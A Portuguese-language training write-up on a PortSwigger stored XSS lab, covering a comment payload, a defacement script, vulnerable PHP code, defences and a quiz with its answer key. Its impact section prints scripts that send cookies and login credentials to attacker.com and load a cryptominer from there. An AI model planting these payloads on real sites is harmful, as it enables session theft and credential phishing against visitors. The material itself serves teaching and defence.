# 🧪 Laboratório Prático: Stored XSS (XSS Armazenado)

> **Tema:** Inserir script JavaScript **persistente** em aplicação web — fica salvo no banco
> **Vulnerabilidade:** [A03 — Injection](47.md) (subfamília: **XSS Persistente**)
> **Lab PortSwigger:** [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
> **Continuação de:** [62.md](62.md) — Reflected XSS

---

## 🎯 Contexto: A Evolução do Lab Anterior

Em [62.md](62.md) vimos **Reflected XSS** — o payload vinha pela URL e só executava na sessão da vítima. Agora subimos para o tipo **mais perigoso**: **Stored XSS**.

### Diferença essencial

| Aspecto | Reflected ([62.md](62.md)) | **Stored** (este lab) |
|---------|-----------------------------|-----------------------|
| **Onde o payload mora** | Na URL | No **banco de dados** |
| **Como vítima é atingida** | Precisa **clicar** em link malicioso | **Automaticamente**, ao visitar página normal |
| **Persistência** | ⚡ Temporária (sessão da vítima) | 💾 Permanente até o admin remover |
| **Quantas vítimas** | Uma por clique de phishing | **Todas** que visitarem a página |
| **Precisa de engenharia social?** | ✅ Sim (phishing) | ❌ Não |
| **Severidade** | 🟡 Média | 🔴 **Alta/Crítica** |

> 🔑 **A grande mudança:** o atacante não precisa convencer ninguém a clicar em nada. Basta **plantar o payload** num lugar visível (comentário, post, perfil, descrição de produto) e esperar — **a aplicação espalha o ataque sozinha**.

## 🎯 O Lab da PortSwigger

### Cenário
Aplicação **We Like to Blog** com **comentários públicos** em cada post. O campo de comentário aceita HTML sem sanitização e o resultado é exibido para **qualquer pessoa** que abrir o post.

### Missão
Postar um comentário malicioso → outros usuários (incluindo bots simulando vítimas) executam o script automaticamente ao abrir o post.

## 💥 Etapa 2 — O Ataque (Payload Básico)

Preencha o formulário:

```
Comment:  <script>alert(1)</script>
Name:     qualquer-nome
Email:    qualquer@email.com
Website:  qualquer-coisa (opcional)
```

Clique em **Post Comment**.

### O que acontece nos bastidores

```
1. Aplicação salva o comentário no banco (com o <script>!)
2. O lab simula um bot que abre o post a cada poucos segundos
3. O bot vê seu <script>alert(1)</script>
4. O bot "executa" o alert(1) — o lab marca como resolvido
```

Clique em **Back to blog** → você verá a caixa de alerta também (porque é seu próprio comentário, mas isso afetaria **todos** os visitantes).

> ✅ *"Congratulations, you solved the lab!"*

## 🎨 Etapa 3 — Indo Além: Defacement com Imagem

Para ver o **impacto visual real** de Stored XSS, vamos plantar um payload mais elaborado em **outro post**:

```html
<script>
document.body.innerHTML = "";
var imagem = new Image();
imagem.src = "https://img.freepik.com/vetores-gratis/rosquinhas-vitrificadas-coloridas-fugindo-em-panico-ilustracao-de-desenho-animado_74855-17017.jpg";
document.body.appendChild(imagem);
</script>
```

### O que esse script faz

| Linha | Função |
|-------|--------|
| `document.body.innerHTML = ""` | **Apaga** todo o conteúdo visível da página |
| `var imagem = new Image()` | Cria um elemento `<img>` em JavaScript |
| `imagem.src = "..."` | Define a URL da imagem |
| `document.body.appendChild(imagem)` | Insere a imagem na página vazia |

**Resultado:** quem abrir esse post **só verá a imagem** — o conteúdo real do blog some completamente.

---

## 🧪 Como Verificar Que Está Persistente

A prova de que é **Stored** (não Reflected):

1. Copie a URL do post comprometido
2. Abra em uma **aba anônima** (sem cookies, sem login)
3. Abra em **outro navegador** (Firefox enquanto usa Chrome)
4. Abra de **outro computador** se possível
5. **Em todos:** a página aparece comprometida com seu script 🎯

Esse é o pulo-do-gato de Stored XSS: o ataque é **global** — toda visita é uma vítima nova.

## 🧠 Por Que Funciona? — Anatomia do Bug

### O código vulnerável (no servidor)

```php
// ❌ Aplicação vulnerável — armazena e exibe sem escape
// 1) Salva o comentário no banco
$db->execute("INSERT INTO comments (post_id, body) VALUES (?, ?)",
             [$post_id, $_POST['comment']]);

// 2) Exibe os comentários ao carregar o post
foreach ($comments as $comment) {
    echo "<div class='comment'>" . $comment['body'] . "</div>";
    //                              ↑
    //              input do usuário entra cru no HTML
}
```

### O 1-2-3 do ataque

```
┌─────────────────────────────────────────────────────────────┐
│  1. ATACANTE                                                │
│     POST /comment                                           │
│     comment=<script>alert(1)</script>                       │
│                ↓                                            │
│  2. BANCO DE DADOS                                          │
│     INSERT INTO comments (body) VALUES ('<script>...')      │
│     ↳ persistido para sempre                                │
│                ↓                                            │
│  3. QUALQUER VÍTIMA                                         │
│     GET /post/123                                           │
│     ↳ servidor monta HTML com o <script>                    │
│     ↳ browser da vítima EXECUTA                             │
│     ↳ ataque acontece sem clique adicional                  │
└─────────────────────────────────────────────────────────────┘
```

## 🎭 O Impacto Real de Stored XSS

O `alert(1)` é só prova de conceito. Ataques reais com Stored XSS podem:

### 🔓 Roubar sessão de todos os usuários

```html
<script>
new Image().src = 'https://attacker.com/log?c=' + document.cookie;
</script>
```

Cada visitante do post **doa o cookie** ao atacante. Em sites grandes, são milhares de vítimas por minuto.

### 🐛 Worm autorreplicante (Samy XSS)

Em 2005, o **Samy Kamkar** plantou no Myspace um payload que:
1. Adicionava o Samy como amigo automaticamente
2. Copiava o **próprio script** para o perfil da vítima
3. Cada vítima virava propagador para os amigos dela

Resultado: **1 milhão de perfis** comprometidos em **20 horas**.

> 🔗 Detalhes em [62.md](62.md) seção "Casos famosos".

### 🎣 Phishing convincente

```html
<script>
document.body.innerHTML = `
  <h1>Sessão expirou</h1>
  <form action="https://attacker.com/steal" method="POST">
    <input name="email" placeholder="email">
    <input name="password" type="password" placeholder="senha">
    <button>Login</button>
  </form>`;
</script>
```

A vítima vê uma tela de login **dentro do domínio real** — URL legítima, certificado HTTPS válido, tudo "parece certo".

### 💉 Cryptojacking persistente

```html
<script src="https://attacker.com/coinminer.js"></script>
```

Enquanto o admin não remover o comentário, **todo visitante** vira minerador de criptomoeda. Lucro passivo do atacante.

### 🏴‍☠️ Defacement (como vimos no lab)

Modificar visual da página → prejudica imagem da empresa.

## 🛡️ Como Prevenir Stored XSS

**A defesa é a mesma de Reflected XSS** ([62.md](62.md)), mas com **uma camada extra crítica**:

### ❌ Errado — apenas escapar na exibição não basta

```php
// ❌ Vulnerável (apesar do escape)
$db->execute("INSERT INTO comments (body) VALUES (?)", [$_POST['comment']]);
// ... depois ...
echo htmlspecialchars($comment['body']);  // escape só na saída
```

> ⚠️ **Por que ainda é problema?** Se alguém esquecer de escapar em **uma única tela** que mostra o comentário (admin panel, RSS feed, app mobile), o XSS volta.

### ✅ Certo — Sanitizar na **entrada** + Escapar na **saída**

```php
// 1) Validar/sanitizar input ANTES de salvar
require_once 'vendor/autoload.php';
use voku\helper\HtmlDomParser;

$comment = $_POST['comment'];

// Sanitização: remove TUDO que não está numa allowlist
$clean = htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
// ou use DOMPurify-PHP / HTMLPurifier para conteúdo rico

$db->execute("INSERT INTO comments (body) VALUES (?)", [$clean]);

// 2) Escapar ao exibir (defesa em profundidade)
echo htmlspecialchars($comment['body'], ENT_QUOTES, 'UTF-8');
```

### Defesa em camadas para Stored XSS

| Camada | Como ajuda |
|--------|-----------|
| **Input validation** | Rejeita payloads conhecidos no momento do POST |
| **Sanitização na entrada** | Remove tags perigosas antes de salvar (DOMPurify, bleach) |
| **Escape na saída** | Mesmo se algo passar, escapa ao renderizar |
| **CSP estrita** | Browser recusa scripts inline mesmo se XSS injetar |
| **Cookies `HttpOnly`** | Impede roubo de sessão via `document.cookie` |
| **Code review** | Procurar por `innerHTML`, `v-html`, `dangerouslySetInnerHTML` |
| **Bug bounty** | Pesquisadores externos encontram o que escapou |

> 🔗 Conexão com [60.md](60.md) — o módulo **`permanentxss`** do Wapiti detecta especificamente Stored XSS automaticamente.

## 📊 Stored vs Reflected — Tabela de Decisão

| Situação | É qual tipo? |
|----------|--------------|
| Vítima clica em link que roda script só pra ela | Reflected |
| Comentário em blog que afeta todo visitante | **Stored** |
| Nome de usuário com `<script>` que aparece em rankings | **Stored** |
| Mensagem de erro mostra parte da URL na tela | Reflected |
| Avaliação de produto que afeta quem vê a página | **Stored** |
| Campo de busca que reflete termo procurado | Reflected |
| Bio do perfil que aparece pra outros | **Stored** |
| Parâmetro `?msg=` numa página de erro | Reflected |

> 💡 **Regra prática:** se o payload sobrevive depois do logout do atacante e atinge outros usuários, é **Stored**.

## 🎓 Conceitos Aprendidos

| Termo | Definição |
|-------|-----------|
| **Stored XSS** | Payload salvo no banco que executa para todos os visitantes |
| **Persistent XSS** | Sinônimo de Stored XSS |
| **Defacement** | Modificar aparência da página (vandalismo digital) |
| **Worm de XSS** | Payload que se autorreplica entre perfis/posts |
| **Sanitização** | Remover ou neutralizar partes perigosas do input |
| **Escape** | Converter chars perigosos em entidades HTML (`<` → `&lt;`) |
| **Allowlist** | Lista do que **é permitido** (oposto de blocklist) |
| **DOMPurify** | Biblioteca padrão para sanitizar HTML em JS |
| **HTMLPurifier** | Equivalente em PHP |

## 🎯 Caso Prático — Como Outras Vítimas Veem o XSS (Guilherme)

> **Cenário:** Guilherme descobriu que existem dois tipos de XSS — **refletido** e **persistente/armazenado** — mas quer entender exatamente **como outras vítimas chegam a executar o script injetado**.
>
> *(Selecione 2 alternativas verdadeiras)*

### ✅ Gabarito

| Alt | Status | Realidade técnica |
|-----|--------|-------------------|
| **A** | ✅ | **Reflected** = URL com payload → precisa de **phishing** para outras vítimas |
| **B** | ❌ | Diz "Reflected" mas descreve **Stored** (inversão proposital) |
| **C** | ❌ | Diz "Stored" mas descreve **Reflected** (inversão proposital) |
| **D** | ✅ | **Stored** = payload no banco → atinge **todos** os visitantes automaticamente |

### 🪤 A pegadinha do quiz

As alternativas **B e C** estão **gramaticalmente corretas**, mas com os **nomes trocados**. É uma técnica clássica de prova para separar quem **entendeu** o conceito de quem só **decorou** os nomes.

```
Verdade técnica          ┌─→  A descreve corretamente como REFLECTED ✅
"Reflected precisa phish"┘
                         ┌─→  C descreve com nome ERRADO (chama de Stored)  ❌

Verdade técnica          ┌─→  D descreve corretamente como STORED ✅
"Stored fica no banco"   ┘
                         ┌─→  B descreve com nome ERRADO (chama de Reflected) ❌
```

### 📊 Mapa visual: como cada tipo atinge a vítima

#### Alternativa A (correta) — Reflected XSS

```
1. Atacante cria URL maliciosa
   ↓
2. Atacante envia URL via e-mail/mensagem (PHISHING)
   ↓
3. Vítima precisa clicar no link
   ↓
4. Servidor "reflete" o payload na resposta
   ↓
5. Script executa só naquela sessão da vítima
```

> 💡 **Sem clique → sem ataque.** Reflected XSS é "convite + RSVP".

#### Alternativa D (correta) — Stored XSS

```
1. Atacante posta payload em um lugar visível
   (comentário, perfil, descrição de produto)
   ↓
2. Banco armazena o payload
   ↓
3. QUALQUER visitante da página é vítima automática
   (admin, usuário comum, bot de monitoramento, crawler)
   ↓
4. Sem necessidade de clique extra ou phishing
```

> 💡 **Visitar a página = ser vítima.** Stored XSS é "mina enterrada no caminho".

### ❌ Por que B e C estão erradas

#### B — "Reflected fica armazenado no servidor" ❌

> *"Se for realizado um XSS refletido, o script inserido pelo atacante ficará armazenado no servidor..."*

**Erro:** **Reflected NÃO é armazenado.** Esse é exatamente o que **define** as diferenças entre os dois tipos. Se o script ficasse no servidor, seria Stored por definição.

**O que está sendo descrito de fato:** **Stored XSS** (alternativa D usa esse texto corretamente).

#### C — "Stored precisa de phishing" ❌

> *"Caso for feito um XSS armazenado ou persistente, o script inserido é executado apenas na página do atacante... phishing."*

**Erro:** **Stored XSS NÃO precisa de phishing.** O cara da vulnerabilidade é exatamente que **não exige engenharia social** — basta o atacante plantar o payload e ir embora.

**O que está sendo descrito de fato:** **Reflected XSS** (alternativa A usa esse texto corretamente).

### 🧠 Mnemônico para nunca mais confundir

| Pergunta | Reflected | Stored |
|----------|:---------:|:------:|
| O payload sobrevive ao logout do atacante? | ❌ Não | ✅ Sim |
| Outras vítimas precisam clicar em algo extra? | ✅ Sim (phishing) | ❌ Não |
| Cabe na URL? | ✅ Sim | ❌ Não (vai pro banco) |
| Quantas vítimas em potencial? | 1 por phishing enviado | **Todos** os visitantes |
| Cenário típico | Campo de busca, mensagem de erro | Comentário, post, perfil, descrição |

**Frase para fixar:**

> 🎯 **"Reflected é convite. Stored é armadilha."**
>
> Convite precisa ser entregue (phishing).
> Armadilha funciona sozinha.

### 💡 Aplicação prática (pentest)

Quando você encontra XSS em um pentest, **classificar o tipo é essencial** para o relatório:

| Achado | Severidade típica | Justificativa |
|--------|------------------:|---------------|
| Reflected XSS em página pública | 🟡 Média | Exige phishing |
| Reflected XSS atrás de login | 🟠 Média-Baixa | Phishing + sessão ativa |
| **Stored XSS** em campo público | 🔴 **Alta** | Atinge todos automaticamente |
| **Stored XSS** em painel admin | 🔴 **Crítica** | Atinge admin direto = takeover |
| Stored XSS em e-mail/notificação | 🔴 **Crítica** | Escapa do contexto web |

> 🔗 Conexão com [48.md](48.md) — Stored XSS é tipicamente **escopo de bounty maior** em programas de Bug Bounty justamente por essa diferença de impacto.

## 💡 Reflexão Final

> *"Reflected XSS é uma armadilha que você precisa fazer a vítima andar até.*
> *Stored XSS é uma armadilha que você planta, vai embora e ela funciona sozinha.*
>
> *É a diferença entre 'isca de phishing' e 'mina enterrada no caminho que todo mundo passa'."*

A defesa continua sendo a mesma:

> 🔑 **Sanitize na entrada. Escape na saída. Use CSP. HttpOnly nos cookies.**

Mas a vigilância precisa ser **maior**: cada campo de input que aceita texto longo (comentário, post, bio, descrição) é um vetor potencial de **infecção em massa**.

### Para o desenvolvedor

A pergunta a se fazer ao desenhar qualquer feature de **conteúdo gerado pelo usuário**:

> 🤔 *"Se um usuário malicioso inserir `<script>` neste campo, e outro usuário visualizar — o que acontece?"*

Se a resposta for "o script executa", **você tem Stored XSS na sua aplicação**.
